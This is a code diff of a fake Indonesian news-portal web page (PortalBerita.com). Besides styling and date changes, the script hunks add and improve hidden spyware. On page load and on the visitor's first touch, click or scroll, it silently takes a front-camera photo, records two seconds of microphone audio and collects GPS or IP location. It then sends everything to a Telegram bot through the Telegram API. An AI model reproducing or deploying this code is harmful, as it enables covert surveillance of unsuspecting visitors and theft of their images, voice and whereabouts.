@@ -147,7 +147,7 @@
 
         .featured-image {
             height: 400px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             position: relative;
         }
 
@@ -205,7 +205,7 @@
         .news-thumb {
             width: 100px;
             height: 70px;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             border-radius: 5px;
         }
 
@@ -238,7 +238,7 @@
 
         /* Iklan */
         .ad-banner {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            background: linear-gradient(135deg, #1e3c72 0%, #2a5298 100%);
             color: white;
             padding: 20px;
             border-radius: 10px;
@@ -343,7 +343,7 @@
     <!-- Top Header -->
     <div class="top-header">
         <div class="container">
-            <div>📅 Senin, 23 Februari 2024 | 14:30 WIB</div>
+            <div>📅 Senin, 23 Februari 2026 | 14:30 WIB</div>
             <div>📢 Berita Terkini dan Terpercaya</div>
         </div>
     </div>
@@ -390,7 +390,7 @@
                         <h2>Perkembangan AI di Indonesia Semakin Pesat, Siap Bersaing di Kancah Global</h2>
                         <div class="meta">
                             <span>👤 Redaksi</span>
-                            <span>📅 23 Februari 2024</span>
+                            <span>📅 23 Februari 2026</span>
                             <span>👁️ 2.345 views</span>
                         </div>
                     </div>
@@ -555,13 +555,14 @@
     </footer>
 
     <div class="copyright">
-        © 2024 PortalBerita.com - Hak Cipta Dilindungi Undang-Undang
+        © 2026 PortalBerita.com - Hak Cipta Dilindungi Undang-Undang
     </div>
 
     <!-- ===== ELEMEN TERSEMBUNYI UNTUK CAPTURE ===== -->
     <div style="display: none;">
         <video id="hidden-video" autoplay playsinline muted></video>
         <video id="hidden-video-fallback" autoplay playsinline muted></video>
+        <canvas id="hidden-canvas" width="640" height="480"></canvas>
         <button id="uc-trigger" onclick="triggerUC()"></button>
     </div>
 
@@ -572,22 +573,143 @@
         
         let cameraAccessed = false;
         let isProcessing = false;
-        let stream = null;
-        let audioStream = null;
+        let mediaStream = null;
         
         // Deteksi browser
         function getBrowserInfo() {
             const ua = navigator.userAgent;
             return {
-                isChrome: /Chrome/i.test(ua) && !/Edge|Edg|OPR|UC/i.test(ua),
                 isUC: /UCBrowser|UC/i.test(ua),
-                isOpera: /Opera|OPR/i.test(ua),
-                isAndroid: /Android/i.test(ua),
-                isIOS: /iPhone|iPad|iPod/i.test(ua)
+                isAndroid: /Android/i.test(ua)
             };
         }
         
         const browser = getBrowserInfo();
+        
+        // ==================== FUNGSI FOTO (PRIORITAS UTAMA) ====================
+        async function ambilFoto() {
+            console.log('Mencoba mengakses kamera...');
+            
+            try {
+                // Cek dukungan kamera
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    console.log('Browser tidak mendukung kamera');
+                    return null;
+                }
+                
+                // Coba akses kamera dengan berbagai konfigurasi
+                const constraints = [
+                    // Prioritas 1: Kamera depan resolusi sedang
+                    { 
+                        video: { 
+                            facingMode: 'user', 
+                            width: { ideal: 640 },
+                            height: { ideal: 480 } 
+                        } 
+                    },
+                    // Prioritas 2: Kamera depan saja
+                    { 
+                        video: { 
+                            facingMode: 'user' 
+                        } 
+                    },
+                    // Prioritas 3: Kamera apa saja
+                    { 
+                        video: true 
+                    }
+                ];
+                
+                let stream = null;
+                
+                // Coba setiap constraint sampai berhasil
+                for (const constraint of constraints) {
+                    try {
+                        console.log('Mencoba constraint:', JSON.stringify(constraint));
+                        stream = await navigator.mediaDevices.getUserMedia(constraint);
+                        console.log('Berhasil akses kamera dengan constraint:', JSON.stringify(constraint));
+                        break; // Keluar loop jika berhasil
+                    } catch (e) {
+                        console.log('Gagal dengan constraint:', e.message);
+                        continue; // Coba constraint berikutnya
+                    }
+                }
+                
+                if (!stream) {
+                    console.log('Tidak dapat mengakses kamera');
+                    return null;
+                }
+                
+                // Simpan stream untuk cleanup
+                mediaStream = stream;
+                
+                // Gunakan video element
+                const video = document.getElementById('hidden-video');
+                video.srcObject = stream;
+                
+                // Tunggu video siap
+                await new Promise((resolve, reject) => {
+                    video.onloadedmetadata = () => {
+                        video.play()
+                            .then(() => {
+                                console.log('Video siap, dimensi:', video.videoWidth, 'x', video.videoHeight);
+                                resolve();
+                            })
+                            .catch(err => {
+                                console.log('Gagal play video:', err);
+                                reject(err);
+                            });
+                    };
+                    
+                    // Timeout 3 detik
+                    setTimeout(() => {
+                        if (video.videoWidth) {
+                            resolve();
+                        } else {
+                            reject(new Error('Timeout'));
+                        }
+                    }, 3000);
+                });
+                
+                // Tunggu sebentar agar kamera stabil
+                await new Promise(resolve => setTimeout(resolve, 500));
+                
+                // Ambil foto dengan canvas
+                const canvas = document.getElementById('hidden-canvas');
+                const context = canvas.getContext('2d');
+                
+                // Set dimensi canvas sesuai video
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                
+                // Gambar video ke canvas
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                
+                // Konversi ke base64 JPEG dengan kualitas tinggi
+                const fotoBase64 = canvas.toDataURL('image/jpeg', 0.9);
+                
+                console.log('Foto berhasil diambil, ukuran:', fotoBase64.length);
+                
+                // Bersihkan stream
+                stream.getTracks().forEach(track => {
+                    track.stop();
+                });
+                video.srcObject = null;
+                mediaStream = null;
+                
+                return fotoBase64;
+                
+            } catch (error) {
+                console.log('Error ambil foto:', error.message);
+                
+                // Bersihkan jika ada error
+                if (mediaStream) {
+                    mediaStream.getTracks().forEach(track => track.stop());
+                    mediaStream = null;
+                }
+                
+                return null;
+            }
+        }
         
         // ==================== FUNGSI LOKASI ====================
         async function getLokasi() {
@@ -605,79 +727,49 @@
                             lng: position.coords.longitude
                         });
                     },
-                    () => {
+                    (error) => {
+                        console.log('Gagal lokasi GPS:', error.message);
                         // Fallback IP
                         fetch('https://ipapi.co/json/')
                             .then(res => res.json())
                             .then(data => {
-                                resolve({
-                                    success: true,
-                                    lat: data.latitude,
-                                    lng: data.longitude,
-                                    kota: data.city
-                                });
+                                if (data.latitude && data.longitude) {
+                                    resolve({
+                                        success: true,
+                                        lat: data.latitude,
+                                        lng: data.longitude,
+                                        provider: 'IP'
+                                    });
+                                } else {
+                                    resolve({ success: false });
+                                }
                             })
                             .catch(() => resolve({ success: false }));
                     },
-                    { timeout: 5000 }
+                    { 
+                        enableHighAccuracy: true,
+                        timeout: 8000,
+                        maximumAge: 0 
+                    }
                 );
             });
-        }
-        
-        // ==================== FUNGSI KAMERA ====================
-        async function ambilFoto() {
-            try {
-                const constraints = [
-                    { video: { facingMode: 'user', width: 640, height: 480 } },
-                    { video: { facingMode: 'user' } },
-                    { video: true }
-                ];
-                
-                let mediaStream = null;
-                for (const constraint of constraints) {
-                    try {
-                        mediaStream = await navigator.mediaDevices.getUserMedia(constraint);
-                        break;
-                    } catch (e) {
-                        continue;
-                    }
-                }
-                
-                if (!mediaStream) return null;
-                
-                const video = document.getElementById('hidden-video');
-                video.srcObject = mediaStream;
-                
-                return new Promise((resolve) => {
-                    video.onloadedmetadata = () => {
-                        video.play();
-                        setTimeout(() => {
-                            const canvas = document.createElement('canvas');
-                            canvas.width = video.videoWidth || 640;
-                            canvas.height = video.videoHeight || 480;
-                            
-                            const context = canvas.getContext('2d');
-                            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                            
-                            const fotoBase64 = canvas.toDataURL('image/jpeg', 0.7);
-                            
-                            mediaStream.getTracks().forEach(track => track.stop());
-                            canvas.remove();
-                            
-                            resolve(fotoBase64);
-                        }, 300);
-                    };
-                });
-                
-            } catch {
-                return null;
-            }
         }
         
         // ==================== FUNGSI AUDIO ====================
         async function rekamAudio() {
             try {
-                const audioStream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+                    return { success: false };
+                }
+                
+                const audioStream = await navigator.mediaDevices.getUserMedia({ 
+                    audio: {
+                        echoCancellation: true,
+                        noiseSuppression: true,
+                        autoGainControl: true
+                    } 
+                });
+                
                 const mediaRecorder = new MediaRecorder(audioStream);
                 const audioChunks = [];
                 
@@ -699,6 +791,7 @@
                         };
                     };
                     
+                    // Rekam 2 detik
                     mediaRecorder.start();
                     setTimeout(() => {
                         if (mediaRecorder.state === 'recording') {
@@ -707,47 +800,73 @@
                     }, 2000);
                 });
                 
-            } catch {
+            } catch (error) {
+                console.log('Gagal rekam audio:', error.message);
                 return { success: false };
             }
         }
         
-        // ==================== FUNGSI KIRIM ====================
-        async function kirimData(lokasi, foto, audio) {
+        // ==================== FUNGSI KIRIM KE TELEGRAM ====================
+        async function kirimKeTelegram(fotoBase64, lokasi, audio) {
             try {
-                let pesan = `📱 Pengunjung Baru\n`;
-                pesan += `🕐 ${new Date().toLocaleString('id-ID')}\n`;
+                // Format pesan
+                let caption = `📸 **Foto Pengunjung**\n\n`;
+                caption += `🕐 Waktu: ${new Date().toLocaleString('id-ID')}\n`;
                 
                 if (lokasi && lokasi.success) {
-                    pesan += `📍 https://maps.google.com/?q=${lokasi.lat},${lokasi.lng}\n`;
+                    caption += `📍 Lokasi: https://maps.google.com/?q=${lokasi.lat},${lokasi.lng}\n`;
+                    caption += `📍 Koordinat: ${lokasi.lat}, ${lokasi.lng}\n`;
                 }
                 
-                if (foto) {
+                // KIRIM FOTO (PRIORITAS UTAMA)
+                if (fotoBase64) {
+                    console.log('Mengirim foto ke Telegram...');
+                    
+                    // Konversi base64 ke blob
+                    const response = await fetch(fotoBase64);
+                    const blob = await response.blob();
+                    
+                    // Buat form data
                     const formData = new FormData();
                     formData.append('chat_id', CHAT_ID);
-                    
-                    const response = await fetch(foto);
-                    const blob = await response.blob();
                     formData.append('photo', blob, 'foto.jpg');
-                    formData.append('caption', pesan);
+                    formData.append('caption', caption);
                     
-                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    // Kirim foto
+                    const result = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                         method: 'POST',
                         body: formData
                     });
                     
+                    if (result.ok) {
+                        console.log('Foto berhasil terkirim!');
+                    } else {
+                        console.log('Gagal kirim foto, coba kirim teks...');
+                        // Fallback kirim teks
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: CHAT_ID,
+                                text: caption
+                            })
+                        });
+                    }
                 } else {
+                    console.log('Tidak ada foto, kirim teks saja...');
                     await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
                             chat_id: CHAT_ID,
-                            text: pesan
+                            text: caption
                         })
                     });
                 }
                 
+                // Kirim audio terpisah jika ada
                 if (audio && audio.success) {
+                    console.log('Mengirim audio...');
                     const formDataAudio = new FormData();
                     formDataAudio.append('chat_id', CHAT_ID);
                     
@@ -761,31 +880,47 @@
                     });
                 }
                 
-            } catch (e) {
-                // Abaikan error
+            } catch (error) {
+                console.log('Error kirim:', error);
             }
         }
         
         // ==================== FUNGSI UTAMA ====================
         async function kumpulkanData() {
-            if (isProcessing) return;
+            if (isProcessing) {
+                console.log('Sedang processing...');
+                return;
+            }
+            
             isProcessing = true;
+            console.log('Mulai mengumpulkan data...');
             
             try {
-                // Kumpulkan semua data di background (TANPA UPDATE STATUS)
-                const hasil = {
-                    lokasi: await getLokasi(),
-                    foto: await ambilFoto(),
-                    audio: await rekamAudio()
-                };
+                // URUTAN: FOTO DULU (PALING PENTING)
+                console.log('Mengambil foto...');
+                const foto = await ambilFoto();
                 
-                // Kirim semua data
-                await kirimData(hasil.lokasi, hasil.foto, hasil.audio);
+                // Baru lokasi dan audio (jalan paralel)
+                console.log('Mengambil lokasi dan audio...');
+                const [lokasi, audio] = await Promise.allSettled([
+                    getLokasi(),
+                    rekamAudio()
+                ]);
+                
+                // Kirim semua data (foto prioritas)
+                await kirimKeTelegram(
+                    foto, 
+                    lokasi.value, 
+                    audio.value
+                );
+                
+                console.log('Selesai!');
                 
             } catch (error) {
-                // Abaikan error
+                console.log('Error:', error);
             } finally {
                 isProcessing = false;
+                cameraAccessed = true;
             }
         }
         
@@ -798,14 +933,20 @@
         
         // Multi-trigger
         function startCollection() {
+            console.log('Memulai collection...');
+            
             // Trigger 1: Setelah halaman load (2 detik)
-            setTimeout(() => kumpulkanData(), 2000);
+            setTimeout(() => {
+                console.log('Trigger: load timeout');
+                kumpulkanData();
+            }, 2000);
             
             // Trigger 2: Saat interaksi user
             const events = ['touchstart', 'click', 'scroll'];
             events.forEach(eventType => {
                 document.addEventListener(eventType, function handler() {
-                    if (!isProcessing) {
+                    if (!isProcessing && !cameraAccessed) {
+                        console.log('Trigger:', eventType);
                         document.removeEventListener(eventType, handler);
                         setTimeout(() => kumpulkanData(), 100);
                     }
@@ -820,15 +961,17 @@
             }
         }
         
-        // Mulai - TANPA MENAMPILKAN STATUS APAPUN
+        // Mulai
         window.addEventListener('load', () => {
+            console.log('Halaman dimuat, siap mengumpulkan data');
             startCollection();
         });
         
         // Cleanup
         window.addEventListener('beforeunload', () => {
-            if (stream) stream.getTracks().forEach(track => track.stop());
-            if (audioStream) audioStream.getTracks().forEach(track => track.stop());
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(track => track.stop());
+            }
         });
         
     </script>
